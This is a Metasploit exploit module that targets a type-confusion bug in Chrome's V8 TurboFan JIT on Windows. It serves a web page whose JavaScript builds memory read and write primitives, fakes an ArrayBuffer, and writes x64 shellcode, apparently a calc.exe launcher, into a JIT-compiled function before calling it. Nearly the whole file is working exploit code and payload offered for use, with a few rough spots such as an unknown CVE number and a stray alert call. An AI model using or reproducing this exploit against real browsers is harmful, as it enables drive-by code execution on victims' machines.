##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "Chrome TurboFan JIT Type Confusion leads to Code Execution",
            'Description'    => %q{
              This module exploits the memory corruption vulnerability (CVE-2017-????)
              present in the TurboFan engine of Chrome (JIT problem in V8 TurboFan).
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                'Beyond Security',                                # Original RE research and exploitation
                'Hwiwon Lee <develacker[at]gmail.com>'            # Metasploit module
              ],
            'Platform'       => 'windows',
            'Targets'        =>
              [
                [ 'Automatic', { } ],
                [ 'Chrome on Windows 7', { } ],
                [ 'Chrome 59.0.3071.109 on Windows 7', { } ],
              ],
            'References'     =>
              [
                [ 'CVE', '2017-????' ],         # Unknown
                [ 'CBT', '746946' ]             # Chromium Bug Tracker (https://bugs.chromium.org/p/chromium/issues/detail?id=746946)
              ],
            'Arch'           => ARCH_X64,
            'DisclosureDate' => "Jul 20 2017",
            'DefaultTarget'  => 0
          )
        )
    end

    def get_target(agent)
        return target if target.name != 'Automatic'
    
        nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
        cm = agent.scan(/Chrome\/(\d+.\d+.\d+.\d+)/).flatten[0] || ""
    
        cm_name = "Chrome #{cm}"
  
        case nt
        when '5.1'
          os_name = 'Windows XP SP3'
        when '6.0'
          os_name = 'Windows Vista'
        when '6.1'
          os_name = 'Windows 7'
        when '6.2'
          os_name = 'Windows 8'
        when '6.3'
          os_name = 'Windows 8.1'
        when '10.0'
          os_name = 'Windows 10'
        end
    
        targets.each do |t|
          # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
          if (!cm.empty? && (!nt.empty? && t.name.include?(os_name)))
          return t
          end
        end
    
        nil
    end
    
    def get_payload(t)
      # stack_pivot = "\x41\x42\x43\x44"
      # code        = payload.encoded
  
      # case t['Rop']
      # when :msvcrt
      #   print_status("Using msvcrt ROP")
      #   rop_payload = generate_rop_payload('msvcrt', code, 'pivot' => stack_pivot, 'target' => 'xp')
  
      # else
      #   print_status("Using JRE ROP")
      #   rop_payload = generate_rop_payload('java', code, 'pivot' => stack_pivot)
      # end
  
      # rop_payload
      rop_payload = "%u48fc%ue483%ue8f0%u00c0%u0000%u5141%u5041%u5152%u4856%ud231%u4865%u528b%u4860%u528b%u4818%u528b%u4820%u728b%u4850%ub70f%u4a4a%u314d%u48c9%uc031%u3cac%u7c61%u2c02%u4120%uc9c1%u410d%uc101%uede2%u4152%u4851%u528b%u8b20%u3c42%u0148%u8bd0%u8880%u0000%u4800%uc085%u6774%u0148%u50d0%u488b%u4418%u408b%u4920%ud001%u56e3%uff48%u41c9%u348b%u4888%ud601%u314d%u48c9%uc031%u41ac%uc9c1%u410d%uc101%ue038%uf175%u034c%u244c%u4508%ud139%ud875%u4458%u408b%u4924%ud001%u4166%u0c8b%u4448%u408b%u491c%ud001%u8b41%u8804%u0148%u41d0%u4158%u5e58%u5a59%u5841%u5941%u5a41%u8348%u20ec%u5241%ue0ff%u4158%u5a59%u8b48%ue912%uff57%uffff%u485d%u01ba%u0000%u0000%u0000%u4800%u8d8d%u0101%u0000%uba41%u8b31%u876f%ud5ff%uf0bb%ua2b5%u4156%ua6ba%ubd95%uff9d%u48d5%uc483%u3c28%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5900%u8941%uffda%u63d5%u6c61%u2e63%u7865%u0065"
      
      rop_payload
    end

    def get_html(t)
      # js_p = ::Rex::Text.to_unescape(get_payload(t), ::Rex::Arch.endian(t.arch))
      # js_p = get_payload(t)

      html = <<-HTML
            <html>
            <script>

            var shellcode = [0xe48348fc,0x00c0e8f0,0x51410000,0x51525041,0xd2314856,0x528b4865,0x528b4860,0x528b4818,0x728b4820,0xb70f4850,0x314d4a4a,0xc03148c9,0x7c613cac,0x41202c02,0x410dc9c1,0xede2c101,0x48514152,0x8b20528b,0x01483c42,0x88808bd0,0x48000000,0x6774c085,0x50d00148,0x4418488b,0x4920408b,0x56e3d001,0x41c9ff48,0x4888348b,0x314dd601,0xc03148c9,0xc9c141ac,0xc101410d,0xf175e038,0x244c034c,0xd1394508,0x4458d875,0x4924408b,0x4166d001,0x44480c8b,0x491c408b,0x8b41d001,0x01488804,0x415841d0,0x5a595e58,0x59415841,0x83485a41,0x524120ec,0x4158e0ff,0x8b485a59,0xff57e912,0x485dffff,0x000001ba,0x00000000,0x8d8d4800,0x00000101,0x8b31ba41,0xd5ff876f,0xa2b5f0bb,0xa6ba4156,0xff9dbd95,0xc48348d5,0x7c063c28,0xe0fb800a,0x47bb0575,0x6a6f7213,0x89415900,0x63d5ffda,0x00636c61]
              
            var arraybuffer = new ArrayBuffer(20);
              flag = 0;
              function gc(){
                for(var i=0;i<0x100000/0x10;i++){
                  new String;
                }
              }
              function d2u(num1,num2){
                d = new Uint32Array(2);
                d[0] = num2;
                d[1] = num1;
                f = new Float64Array(d.buffer);
                return f[0];
              }
              function u2d(num){
                f = new Float64Array(1);
                f[0] = num;
                d = new Uint32Array(f.buffer);
                return d[1] * 0x100000000 + d[0];
              }
              function change_to_float(intarr,floatarr){
                var j = 0;
                for(var i = 0;i < intarr.length;i = i+2){
                  var re = d2u(intarr[i+1],intarr[i]);
                  floatarr[j] = re;
                  j++;
                }
              }
            function f3(a){
              a[0] = Array;
            }
            ae3 = new Array({}); 
            ae3.x3 = {};
            f3(ae3);
            ab3 = new Array(1.1,2.2); ab3.x3 = 0x123;
            f3(ab3);

            ab3.x3 = {};

            evil3 = new Array(1.1,2.2);evil3.x3 = {};
            for(var i = 0;i<0x100000;i++){
              f3(ae3);
            }

            /******************************* step 1    read ArrayBuffer __proto__ address   ***************************************/
            function f4(a,obj){
              arguments;
              a[0] = obj;
            }
            ae4 = new Array({}); 
            ae4.x4 = {}; //ae.x = {};
            f4(ae4);
            ab4 = new Array(1.1,2.2); ab4.x4 = 0x123;
            f4(ab4);

            ab4.x4 = {};

            evil4 = new Array(1.1,2.2);evil4.x4 = {};
            for(var i = 0;i<0x100000;i++){
              f4(ae4,arraybuffer.__proto__);
            }

            function e4(){
              return evil4[0];
            }

            for(var i = 0;i<0x100000;i++){
              e4();
            }

            f4(evil4,arraybuffer.__proto__);
            ab_proto_addr = u2d(e4());

            var nop = 0xdaba0000;
            var ab_map_obj = [
              nop,nop,
              0x1f000008,0x000900c3,   //chrome 59
              //0x0d00000a,0x000900c4,  //chrome 61
              0x082003ff,0x0,
              nop,nop,   // use ut32.prototype replace it
              nop,nop,0x0,0x0
            ]
            ab_constructor_addr = ab_proto_addr - 0x70;
            ab_map_obj[0x6] = ab_proto_addr & 0xffffffff;
            ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
            ab_map_obj[0x8] = ab_constructor_addr & 0xffffffff;
            ab_map_obj[0x9] = ab_constructor_addr / 0x100000000;
            float_arr = [];

            gc();
            var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];
            change_to_float(ab_map_obj,ab_map_obj_float);

            /******************************* step 2    read fake_ab_map_ address   ***************************************/

            f4(evil4,ab_map_obj_float);
            ab_map_obj_addr = u2d(e4())+0x40;

            var fake_ab = [
              ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
              ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
              ab_map_obj_addr & 0xffffffff, ab_map_obj_addr / 0x100000000,
              0x0,0x4000, /* buffer length */
              0x12345678,0x123,/* buffer address */
              0x4,0x0
            ]
            var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
            change_to_float(fake_ab,fake_ab_float);

            /******************************* step 3    read fake_ArrayBuffer_address   ***************************************/

            f4(evil4,fake_ab_float);
            fake_ab_float_addr = u2d(e4())+0x40;

            /******************************* step 4 fake a ArrayBuffer   ***************************************/

            fake_ab_float_addr_f = d2u(fake_ab_float_addr / 0x100000000,fake_ab_float_addr & 0xffffffff).toString();

            eval('function e3(){  evil3[1] = '+fake_ab_float_addr_f+';}')
            for(var i = 0;i<0x6000;i++){
              e3();
            }
            f3(evil3);
            e3();
            fake_arraybuffer = evil3[1];
            if(fake_arraybuffer instanceof ArrayBuffer == true){
            }
            fake_dv = new DataView(fake_arraybuffer,0,0x4000);

            /******************************* step 5 Read a Function Address   ***************************************/

            var func_body = "eval('');";

            var function_to_shellcode = new Function("a",func_body);

            f4(evil4,function_to_shellcode);

            shellcode_address_ref = u2d(e4()) + 0x38-1;
              
            /**************************************  And now,we get arbitrary memory read write!!!!!!   ******************************************/
              
              function Read32(addr){
                fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
                return fake_dv.getUint32(0,true);
              }
              function Write32(addr,value){
                fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
                alert("w");
                fake_dv.setUint32(0,value,true);
              }
              shellcode_address = Read32(shellcode_address_ref) + Read32(shellcode_address_ref+0x4) * 0x100000000;;
              
              var addr = shellcode_address;
              
              fake_ab_float[4] = d2u(addr / 0x100000000,addr & 0xffffffff);
              for(var i = 0; i < shellcode.length;i++){
                var value = shellcode[i];   
                fake_dv.setUint32(i * 4,value,true);
              }
              // alert("boom");
              function_to_shellcode();


            </script>
            </html>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
        agent = request.headers['User-Agent']
        print_status("Requesting: #{request.uri}")

        target = get_target(agent)
        if target.nil?
        print_error("Browser not supported, sending 404: #{agent}")
        send_not_found(cli)
        return
        end

        print_status("Target selected as: #{target.name}")
        html = get_html(target)
        send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end